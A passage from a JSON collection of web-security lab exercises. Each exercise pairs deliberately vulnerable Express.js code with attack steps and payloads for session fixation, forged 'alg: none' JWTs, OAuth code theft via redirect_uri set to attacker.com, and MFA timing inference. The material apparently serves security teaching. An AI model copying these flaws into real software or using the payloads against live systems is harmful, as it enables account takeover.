    "Lab Description": "This application implements an inactivity-based session timeout mechanism, but includes a hidden GraphQL keep-alive endpoint that can be abused to extend sessions silently. The attacker can keep Carlos's session alive by calling the internal ping endpoint while in possession of his session ID. To solve: Hijack Carlos’s session, maintain it alive using the hidden endpoint, and access /my-account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to spider the site and discover hidden GraphQL endpoint /graphql with operationName: pingSession.",
      "Observe the application sets short-lifetime session cookies; hijack a leaked session cookie (simulated) for Carlos.",
      "Send periodic POST requests to /graphql with payload {operationName: \"pingSession\"} using Postman or Burp Repeater.",
      "Maintain session activity every few seconds to prevent timeout while testing access to /my-account.",
      "Finally access /my-account using the hijacked cookie to validate the bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'keep-secret', cookie: { maxAge: 10000 }, resave: false, saveUninitialized: true })); app.use(express.json()); app.post('/graphql', (req, res) => { if (req.body.operationName === 'pingSession') { return res.send({ data: { pingSession: true } }); } res.status(400).send('Invalid operation'); }); app.get('/my-account', (req, res) => { if (!req.session.user || req.session.user !== 'carlos') return res.status(401).send('Unauthorized'); res.send('Carlos account details'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Timeout Bypass Lab on http://localhost:${PORT}`));",
    "payloads": [
      "POST /graphql HTTP/1.1",
      "{\"operationName\":\"pingSession\"}",
      "Cookie: session=carlos-session-id",
      "GET /my-account HTTP/1.1 with same session cookie"
    ]
  },
  {
    "Lab scenario": "Session Fixation vulnerability in login flow via fixed session ID in cookie header",
    "Lab Description": "The REST-based login flow accepts a session ID from the client before authentication and reuses it after successful login. The application fails to issue a new session identifier after login. To solve: Fixate a session ID and use it to hijack the authenticated session of the victim after login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the GET /login request and observe that a session cookie is issued before login.",
      "2. Send the login request to Burp Repeater and craft a new login POST /login request with a manually fixed session cookie (e.g., sessionid=fixated1234).",
      "3. Using a second browser or curl, perform login using victim credentials while reusing the fixed sessionid=fixated1234.",
      "4. After login, confirm that the same sessionid is still valid and authenticated by visiting GET /account.",
      "5. In your own browser, set your session cookie to sessionid=fixated1234 and access GET /account to hijack the victim session and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'letmein' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); sessions[sid] = user.username; res.cookie('sessionid', sid); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]) { res.send(`Welcome ${sessions[sid]}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4001, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionid=fixated1234",
      "POST /login with fixed Cookie: sessionid=fixated1234",
      "GET /account with sessionid=fixated1234"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'alg: none' in Authorization header",
    "Lab Description": "The application uses JWTs to authorize users via a REST API. However, the server accepts unsigned JWTs when the algorithm is set to 'none'. To solve: Craft a tampered JWT that impersonates the admin user and access the protected endpoint.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use Burp to capture the Authorization: Bearer <JWT> header after logging in as a regular user.",
      "2. Decode the JWT using jwt.io or any JWT tool and modify the payload to {\"username\":\"admin\"} and set \"alg\":\"none\" in the header.",
      "3. Remove the signature part of the JWT so it becomes a two-part token.",
      "4. Replace the Authorization header with the tampered unsigned JWT.",
      "5. Send a GET request to /admin-panel and confirm admin access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secretkey'); res.json({ token }); }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.username === 'admin') return res.send('Welcome admin'); } res.status(403).send('Unauthorized'); }); app.listen(4002, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer [tampered_none_alg_token]",
      "GET /admin-panel with unsigned JWT"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri allowing code interception",
    "Lab Description": "The application uses OAuth 2.0 for SSO authentication with a misconfigured redirect URI pattern. An attacker can inject a malicious redirect URI to intercept the authorization code. To solve: Steal Carlos’s OAuth authorization code and exchange it for a token to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to inspect the OAuth authorization request (GET /oauth/authorize). Note the redirect_uri parameter pattern and how it lacks strict validation.",
      "2. Set up a temporary request bin or web server to log incoming GET requests.",
      "3. Craft an authorization link with redirect_uri set to your controlled domain (e.g., https://attacker.com/callback).",
      "4. Trick the victim into clicking the link or submit it as part of a CSRF payload.",
      "5. Capture the intercepted code at your endpoint and exchange it via POST /oauth/token to get access_token.",
      "6. Use the token to access the user account via GET /user-info or /account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const oauthCodes = {}; const accessTokens = {}; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); oauthCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (oauthCodes[code]) { const token = 'token-' + Math.random().toString(36).substring(2); accessTokens[token] = oauthCodes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (accessTokens[token]) { return res.send(`Welcome ${accessTokens[token]}`); } res.status(403).send('Invalid token'); }); app.listen(4003, () => console.log('OAuth Code Interception Lab running'));",
    "payloads": [
      "https://vulnerable.app/oauth/authorize?client_id=123&redirect_uri=https://attacker.com/callback&state=xyz",
      "GET /callback?code=stolen_code",
      "POST /oauth/token with stolen_code",
      "GET /account with Authorization: Bearer stolen_token"
    ]
  },
 
  {
    "Lab scenario": "JWT tampering via none algorithm in login API",
    "Lab Description": "This application uses JWTs for session management but improperly allows the 'alg' header to be tampered with. The backend incorrectly trusts tokens signed with 'none' algorithm. To solve: Forge a token using alg: none to impersonate Carlos and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Postman to capture a valid JWT after logging in as a regular user.",
      "2. Decode the token and examine the header and payload fields.",
      "3. Modify the header to use \"alg\": \"none\" and set the payload username to \"carlos\".",
      "4. Remove the signature section and rebase64 the header.payload.",
      "5. Use Burp Suite to set the forged token in the Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'supersecret' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] }); if (decoded.user === 'carlos') res.send('Carlos account data'); else res.send('Access denied'); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4001, () => console.log('JWT None Algorithm Lab running on port 4001'));",
    "payloads": [
      "JWT with header: {\"alg\": \"none\"}, payload: {\"user\":\"carlos\"}",
      "Authorization: Bearer <forged_token>",
      "GET /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration leaks access token",
    "Lab Description": "This app uses OAuth 2.0 implicit flow but returns the access token in the URL fragment, which gets logged insecurely due to verbose frontend debug logging. To solve: Steal Carlos’s access token from the client-side logs and access his account using the leaked token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Navigate to /login/oauth and capture the redirected URL after login, which contains the access_token in the fragment (#access_token=...).",
      "2. Open browser dev tools or intercept via OWASP ZAP and observe debug logs leaking the full redirect URL.",
      "3. Extract Carlos's access token from the logs when he logs in.",
      "4. Replay a request to /my-account using Authorization: Bearer <leaked_token>.",
      "5. Confirm successful access to Carlos’s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'ey123carlos' }; app.get('/login/oauth', (req, res) => { const user = req.query.user; const token = tokens[user]; res.redirect(`/callback#access_token=${token}`); }); app.get('/callback', (req, res) => { const debugInfo = req.url; console.log('DEBUG LOG:', debugInfo); res.send('OAuth callback page with token in fragment'); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer ey123carlos') res.send('Carlos account view'); else res.status(403).send('Unauthorized'); }); app.listen(4002, () => console.log('OAuth Token Leak Lab running on port 4002'));",
    "payloads": [
      "Access token: ey123carlos",
      "Authorization: Bearer ey123carlos",
      "GET /my-account"
    ]
  },
  {
    "Lab scenario": "OAuth Session Fixation in Authorization Code Flow",
    "Lab Description": "The OAuth implementation in this app allows session fixation during the authorization flow. The application fails to invalidate pre-existing sessions before completing the OAuth login. To solve: Fixate a session using a crafted OAuth URL, then hijack the victim’s session after authorization.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept initial OAuth request using Burp Suite and observe redirection with session cookie",
      "Replay the login flow with a fixed session and send OAuth link to victim",
      "After victim authorizes the app, reuse the same session cookie",
      "Access victim's account using the fixed session",
      "Verify successful hijack by accessing victim’s dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'sessfix', resave: false, saveUninitialized: true })); app.get('/auth/callback', (req, res) => { const { code } = req.query; if (code === 'valid-oauth-code') { req.session.user = 'victim'; res.redirect('/dashboard'); } else { res.status(401).send('Invalid auth'); } }); app.get('/dashboard', (req, res) => { if (req.session.user) { res.send('Welcome ' + req.session.user); } else { res.status(403).send('Unauthorized'); } }); app.listen(5000);",
    "payloads": [
      "https://vuln-app.com/auth/callback?code=valid-oauth-code",
      "Session: PHPSESSID=fixatedsessioncookie",
      "Replay same session cookie post-authorization"
    ]
  },
  {
    "Lab scenario": "JWT Algorithm Confusion in Admin Role Verification",
    "Lab Description": "The application uses JWTs for role-based access control but fails to enforce a specific algorithm. This allows token forgery via 'alg' manipulation. To solve: Forge a JWT using 'none' or 'HS256' and escalate privileges to access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture JWT after login using Burp Suite",
      "Decode and analyze JWT header and payload",
      "Modify header to use 'alg':'none' or 'HS256', and set 'role':'admin'",
      "Sign or strip signature based on algorithm",
      "Use forged token to access /admin and verify role escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'jwt-secret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth.split(' ')[1]; const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); if (decoded.role === 'admin') { res.send('Welcome admin'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
    "payloads": [
      "{ \"alg\": \"none\" }.{ \"user\": \"carlos\", \"role\": \"admin\" }.",
      "HS256 signed token with 'admin' role using known secret",
      "Authorization: Bearer <forged-token>"
    ]
  },
  {
    "Lab scenario": "GraphQL Blind MFA Bypass via Timing Attack",
    "Lab Description": "The GraphQL API verifies MFA tokens but leaks timing differences based on token correctness. The application delays responses when the correct prefix is guessed. To solve: Infer valid MFA token character-by-character using response delays, then authenticate as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or custom script to send GraphQL mutation for MFA validation",
      "Measure response times for incremental brute-force of MFA token",
      "Identify valid characters by analyzing delay patterns",
      "Reconstruct full MFA code using character inference",
      "Submit full token to gain access to Carlos’s account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const mfaCodes = { 'carlos': '428957' }; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('verifyMfa')) { const match = query.match(/username: \\\"(.*?)\\\", token: \\\"(\\d+)\\\"/); const [, username, token] = match; if (mfaCodes[username].startsWith(token)) { setTimeout(() => { res.json({ data: { verifyMfa: token === mfaCodes[username] } }); }, token.length * 200); } else { res.json({ data: { verifyMfa: false } }); } } }); app.listen(6000);",
    "payloads": [
      "{ \"query\": \"mutation { verifyMfa(username: \\\"carlos\\\", token: \\\"4\\\") }\" }",
      "{ \"query\": \"mutation { verifyMfa(username: \\\"carlos\\\", token: \\\"42\\\") }\" }",
      "{ \"query\": \"mutation { verifyMfa(username: \\\"carlos\\\", token: \\\"428957\\\") }\" }"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable token reuse",
    "Lab Description": "The application implements session-based authentication but fails to regenerate session tokens after login. The session remains valid even if the user logs in from a previously fixed session. To solve: hijack Carlos's session by fixing a known session ID before login and accessing his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. In Burp Suite, capture a GET /login request and note the Set-Cookie: session=abc123 format.",
      "2. Modify your request to use a preset session cookie and log in as your own user with the fixed session ID.",
      "3. Send this same session ID to the victim (Carlos) and trick them into logging in using it (simulate via Repeater).",
      "4. After Carlos logs in using the fixed session, reuse the same session ID in your browser.",
      "5. Access /account and confirm Carlos’s account data loads with the fixed session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'hunter2', alice: 'password1' }; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username] === password) { const session = req.cookies.session || 'abc123'; sessions[session] = username; res.cookie('session', session); res.redirect('/account'); } else { res.send('Login failed'); } }); app.get('/account', (req, res) => { const session = req.cookies.session; const user = sessions[session]; if (user) res.send(`Account: ${user}`); else res.send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "Cookie: session=abc123",
      "POST /login with session cookie set before login",
      "GET /account with reused session=abc123"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via 'none' value",
    "Lab Description": "The server incorrectly accepts JWTs signed with the 'none' algorithm due to a misconfigured library. It doesn't verify the signature, allowing token manipulation. To solve: forge a JWT token for the user 'admin' with alg=none and access the admin panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture a JWT from a successful login using Burp Suite.",
      "2. Decode the JWT using jwt.io or Postman, observe the alg: 'HS256'.",
      "3. Craft a new JWT with {\"alg\":\"none\"} and payload: {\"user\":\"admin\"}.",
      "4. Remove the signature entirely and send it as Authorization: Bearer <token>.",
      "5. Access the /admin panel and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { admin: 'adminpass', bob: 'bobpass' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); } else res.status(401).send('Invalid'); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'admin') return res.send('Welcome Admin'); } jwt.verify(token, 'secret'); res.send('Token verified'); } catch { res.status(403).send('Invalid Token'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "Authorization: Bearer <JWT-with-none-alg>",
      "GET /admin with tampered JWT"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via redirect misconfiguration",
    "Lab Description": "This lab uses OAuth2 for third-party login. However, the redirection URI is not properly validated, allowing token leakage via a malicious redirect endpoint. To solve: steal Carlos’s token using a crafted redirect_uri and access the account resource.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Using Burp Suite, initiate OAuth login and observe the redirect_uri parameter.",
      "2. Modify redirect_uri to point to a controlled domain (e.g., https://attacker.com/capture).",
      "3. Simulate Carlos initiating OAuth login with your crafted URL and capture the token in logs.",
      "4. Extract the token from the redirect_uri fragment or query string.",
      "5. Use the stolen access token in Authorization: Bearer header to access Carlos’s /account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123token' }; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const token = tokens['carlos']; const redirectUrl = `${redirect_uri}?access_token=${token}&state=${state}`; res.redirect(redirectUrl); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123token') res.send('Carlos Account Accessed'); else res.status(403).send('Invalid token'); }); app.listen(5000);",
    "payloads": [
      "GET /auth?redirect_uri=https://attacker.com/capture",
      "Extract access_token from redirect",
      "Authorization: Bearer abc123token",
      "GET /account with stolen token"
    ]
  },
  {
    "Lab scenario": "Session Fixation in legacy auth redirect endpoint",
    "Lab Description": "This lab's authentication mechanism improperly allows reuse of fixed session identifiers via a deprecated `/legacy-auth` endpoint. The application trusts the session cookie even before the login is completed. To solve: Fixate a valid session identifier for Carlos and access their account page post-authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept a GET /login request and note the `Set-Cookie: sessionid=XYZ` header.",
      "Send a GET request to /legacy-auth?user=carlos with a predefined session cookie and observe that the session is accepted pre-login.",
      "Craft a session fixation payload using: Cookie: sessionid=attackersession; GET /legacy-auth?user=carlos",
      "In another browser/session, reuse attackersession to access /account and confirm elevated access.",
      "Verify lab completion by accessing /account with Carlos's session pre-set."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { 'carlos': { password: 'letmein', session: '' } }; app.get('/legacy-auth', (req, res) => { const { user } = req.query; if (users[user]) { users[user].session = req.cookies['sessionid']; res.send('Legacy session set'); } else { res.status(404).send('User not found'); } }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { res.cookie('sessionid', users[username].session || 'sess' + Math.random().toString(36)); res.send('Logged in'); } else { res.status(401).send('Login failed'); } }); app.get('/account', (req, res) => { const session = req.cookies['sessionid']; const user = Object.keys(users).find(u => users[u].session === session); if (user) { res.send('Welcome ' + user); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "GET /legacy-auth?user=carlos Cookie: sessionid=abc123",
      "GET /account Cookie: sessionid=abc123",
      "POST /login body: username=carlos&password=letmein"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via 'none' algorithm",
    "Lab Description": "The application uses JWTs to authenticate users, but fails to verify the algorithm properly. If the algorithm is set to 'none', the signature is not validated, allowing attackers to forge arbitrary tokens. To solve: Forge a token granting admin access and view the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to intercept the JWT from a valid login response and decode it at jwt.io.",
      "Modify the header to { \"alg\": \"none\" } and set payload { \"username\": \"admin\", \"role\": \"admin\" }.",
      "Remove the signature and re-encode the token.",
      "Use Burp Suite to replace the Authorization header with: Bearer <forged_token>.",
      "Access /admin-panel and verify that admin functions are exposed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = { 'admin': { password: 'supersecure' }, 'user': { password: 'password' } }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const token = jwt.sign({ username, role: username === 'admin' ? 'admin' : 'user' }, 'secret'); res.json({ token }); } else { res.status(401).json({ error: 'Invalid login' }); } }); app.get('/admin-panel', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(403).send('No token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = jwt.decode(token); if (payload.role === 'admin') return res.send('Admin panel accessed'); } else { const verified = jwt.verify(token, 'secret'); if (verified.role === 'admin') return res.send('Admin panel accessed'); } } catch (e) { return res.status(403).send('Invalid token'); } res.status(403).send('Unauthorized'); }); const PORT = 4001; app.listen(PORT, () => console.log(`JWT None Bypass Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "JWT: header: { \"alg\": \"none\" }, payload: { \"username\": \"admin\", \"role\": \"admin\" }, no signature",
      "Authorization: Bearer <forged_token>",
      "GET /admin-panel"
    ]
  },
  {
    "Lab scenario": "OAuth code leakage via Referer header to third-party",
    "Lab Description": "The OAuth implementation leaks authorization codes via the Referer header when redirecting users back to a third-party site. This flaw allows attackers to intercept OAuth codes and obtain access tokens tied to victim accounts. To solve: Intercept Carlos’s OAuth code and reuse it to hijack their session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to monitor the Referer headers during OAuth redirection to the third-party callback URL.",
      "Identify a logged-in request to /callback?code=XXX where the Referer contains the leaked OAuth code.",
      "Copy the code and replay the token exchange using Postman: POST /token with code=XXX, client_id, and redirect_uri.",
      "Use the access_token to call /user-info and confirm account takeover of Carlos.",
      "Access /account with Authorization: Bearer <access_token> to complete lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const oauthCodes = {}; const accessTokens = {}; app.get('/auth', (req, res) => { const code = Math.random().toString(36).substring(2); oauthCodes[code] = 'carlos'; res.redirect('http://third-party-site.com/callback?code=' + code); }); app.post('/token', (req, res) => { const { code, client_id, redirect_uri } = req.body; const user = oauthCodes[code]; if (user) { const token = Math.random().toString(36).substring(2); accessTokens[token] = user; res.json({ access_token: token }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/user-info', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; const user = accessTokens[token]; if (user) { res.send('User info for ' + user); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Code Leakage Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "GET /auth -> watch Referer to third-party for code leakage",
      "POST /token with stolen code",
      "GET /user-info Authorization: Bearer <stolen_access_token>",
      "GET /account Authorization: Bearer <stolen_access_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via path parameter injection in REST API",
    "Lab Description": "This lab's REST API session management mechanism is vulnerable to session fixation through path parameter injection. The application assigns session tokens based on user-supplied session IDs if present. To solve the lab, hijack Carlos's session and access his account page using a crafted session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a normal login flow using Burp Suite and observe that the server accepts custom session IDs via /api/session/:sessionid path parameter.",
      "Use OWASP ZAP to confirm that a preset session ID like /api/session/fix1234 still logs you in under your own credentials.",
      "Craft a malicious URL with a known session ID like /api/session/fixcarlos and send it to the victim (or simulate the victim visiting it).",
      "Log in yourself using the same session ID via /api/session/fixcarlos and access /api/account.",
      "Verify successful session fixation by viewing Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = { 'carlos': 'secret123', 'admin': 'adminpass' }; app.get('/api/session/:sid', (req, res) => { const sid = req.params.sid; sessions[sid] = sessions[sid] || { user: null }; res.cookie('sessionid', sid); res.send('Session initialized'); }); app.post('/api/login', (req, res) => { const sid = req.cookies.sessionid; const { username, password } = req.body; if (users[username] === password && sid) { sessions[sid].user = username; res.send('Login successful'); } else { res.status(401).send('Invalid'); } }); app.get('/api/account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid] && sessions[sid].user) { res.send('Account of ' + sessions[sid].user); } else { res.status(403).send('Unauthorized'); } }); app.listen(3000);",
    "payloads": [
      "/api/session/fixcarlos",
      "POST /api/login with sessionid=fixcarlos",
      "GET /api/account with sessionid=fixcarlos"
    ]
  },
  {
    "Lab scenario": "JWT key confusion attack using 'none' algorithm in GraphQL API",
    "Lab Description": "This GraphQL API-based authentication system fails to validate JWT signature algorithms properly. The backend accepts tokens signed with 'none' algorithm, assuming any token with valid claims is trustworthy. To solve the lab, forge a JWT token impersonating the admin and access the GraphQL /me endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a valid login mutation in GraphQL using Postman and inspect the returned JWT.",
      "Decode the JWT using jwt.io and observe it uses HS256 algorithm.",
      "Craft a new JWT with header {\"alg\":\"none\"} and payload {\"username\":\"admin\"}.",
      "Remove the signature completely and re-encode the token using base64url.",
      "Use Burp Suite to inject the forged token as Authorization: Bearer <token> and query /graphql { me { username } }.",
      "Confirm that the user is admin and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = { 'admin': 'adminpass', 'user': 'userpass' }; const secret = 'mysecret'; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token) { try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); req.user = decoded.username; } catch (e) { return res.status(403).send('Invalid token'); } } const query = req.body.query; if (query.includes('me')) { res.send({ data: { me: { username: req.user || 'guest' } } }); } else { res.status(400).send('Bad query'); } }); app.listen(4000);",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer <none-alg-token>",
      "GraphQL query: { me { username } }"
    ]
  },
  {
    "Lab scenario": "OAuth token reuse via insecure redirect_uri in authorization server",
    "Lab Description": "This OAuth implementation uses an insecure wildcard pattern in redirect_uri validation. This allows an attacker to reuse a stolen authorization code at their own domain. To solve the lab, intercept Carlos’s OAuth code and exchange it at your controlled redirect_uri to get his access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate OAuth login and observe the redirect_uri validation mechanism.",
      "Discover that redirect_uri=https://attacker.com/callback is accepted due to wildcard *.trusted-oauth.com match.",
      "Simulate a phishing link containing Carlos’s authorization code sent to your malicious domain.",
      "Exchange this code using a POST request to the /token endpoint including your redirect_uri.",
      "Use the access_token to access /userinfo endpoint as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = {}; const accessTokens = {}; const clients = [{ client_id: 'trusted', redirect_uri: '*.trusted-oauth.com' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const validClient = clients.find(c => c.client_id === client_id && redirect_uri.includes(c.redirect_uri.replace('*', ''))); if (!validClient) return res.status(400).send('Invalid client'); const code = Math.random().toString(36).substring(2); authCodes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code, redirect_uri } = req.body; if (authCodes[code]) { const token = 'token-' + Math.random().toString(36).substring(2); accessTokens[token] = authCodes[code]; return res.json({ access_token: token }); } res.status(400).send('Invalid code'); }); app.get('/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = accessTokens[token]; if (user) { res.json({ user }); } else { res.status(403).send('Invalid token'); } }); app.listen(5000);",
    "payloads": [
      "redirect_uri=https://attacker.com/callback",
      "GET /authorize?client_id=trusted&redirect_uri=https://attacker.com/callback",
      "POST /token with code=<stolen_code>&redirect_uri=https://attacker.com/callback",
      "Authorization: Bearer <access_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login session token",
    "Lab Description": "The application issues a session token before authentication, which is reused after login without regeneration. This allows session fixation attacks if an attacker sets the session cookie for the victim before login. The application accepts session cookies from unauthenticated users and does not reissue them after successful login. To solve: Fixate a session and gain unauthorized access to Carlos's account using the same token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the GET /login request with Burp Suite and observe the Set-Cookie header issuing sessionId.",
      "Send the login request with Burp Repeater using your own session cookie and complete login.",
      "Confirm that session ID does not change after login, indicating fixation is possible.",
      "Trick Carlos into logging in with the session ID you control (simulate by using same token pre-login).",
      "Use the same session ID in your browser to access Carlos's authenticated session and navigate to /my-account."
    ],
    "Vulnerability name": "Authentication",
